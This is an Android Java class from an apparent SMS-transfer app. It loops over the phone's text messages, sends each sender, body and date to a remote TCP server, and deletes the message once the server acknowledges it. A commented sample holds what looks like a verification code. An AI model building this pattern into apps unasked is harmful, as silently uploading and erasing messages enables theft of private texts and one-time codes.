package com.example.guo.smstrans;


import android.content.Context;
import android.util.Log;

/**
 * Created by Zhang on 2017/4/27.
 */

public class TaskWork {

    private final Context mContext;
    private TcpClient mTcpClient;
    private Thread mStartWork;
    private Packet mPacket;
    private int index;
    private boolean IsQuit;//是否要退出线程


    TaskWork(Context context, TcpClient mTcpClient) {
        //初始化数据
        this.mContext = context;
        this.mTcpClient = mTcpClient;
        mPacket = new Packet();
        index = 1;
    }

    void StartThreadWork() {
        ClosemStartWork();
        mStartWork = new Thread(new StartWork());
        mStartWork.start();
        IsQuit = false;
    }

    public void setIndex(int index) {
        this.index = index;
    }

    //开始工作
    private class StartWork implements Runnable {

        @Override
        public void run() {
            while (true) {
                //打印线程ID
                //Log.i("----","读取短信线程：ThreadID"+mThreadID.getThreadID());
                //是否退出线程
                if (IsQuit) {
                    Log.i("----", "线程退出");
                    break;
                }
                //状态是连接成功
                int State = mTcpClient.getmState();
                Log.i("----", "Tcpclient客户端:State:" + State);
                if (mTcpClient.getmState() == mTcpClient.STATE_CONNECT_SUCCESS) {
                    SmsInfo smsInfo = new SmsInfo(mContext);
                    //判断短信读取是否成功
                    if (smsInfo.readSmsCode(index)) {
                        mPacket.pack(
                                "address:" + smsInfo.getSmsInfo_address() + "@"
                                        + "body:" + smsInfo.getSmsInfo_body() + "@"
                                        + "data:" + smsInfo.getSmsInfo_data() + "@"
                        );
                        Log.i("----", "发送数据" +
                                "address:" + smsInfo.getSmsInfo_address() + "@"
                                + "body:" + smsInfo.getSmsInfo_body() + "@"
                                + "data:" + smsInfo.getSmsInfo_data() + "@");


                        //mPacket.pack("address:13810000000@body:4600124865791583&9512@data:20170623174953@");
                        //发送数据
                        mTcpClient.send(mPacket);
                        Long beginTime = System.currentTimeMillis();//获取开始时间
                        //判断上传成功否
                        // 循环判断是否有标记‘10000’
                        while (true) {
                            // 接收的数据
                            String Flags = mTcpClient.getResponse();
                            if (Flags != null && Flags.equals("10000")) {
                                mTcpClient.setResponse("");
                                //上传成功-删除短信
                                if (smsInfo.DeleteSms()) {
                                    Log.i("----", "删除短信成功");
                                    break;
                                }

                            }
                            //等待接受超过10秒下一个
                            if ((System.currentTimeMillis() - beginTime) > 10 * 1000) {
                                //获取超时下一个
                                break;
                            }
                        }
                    }
                    //没有短信
                }
                // mHandler.postDelayed(mStartWork, 1000);
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

            }
        }
    }


    // 关闭工作线程
    synchronized void ClosemStartWork() {
        try {
            //
            if (null != mStartWork && mStartWork.isAlive()) {
                IsQuit = true;
                //停止该线程
                mStartWork.interrupt();
                Log.i("----", "停止线程");
                mStartWork.getId();
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            mStartWork = null;
        }
    }
}
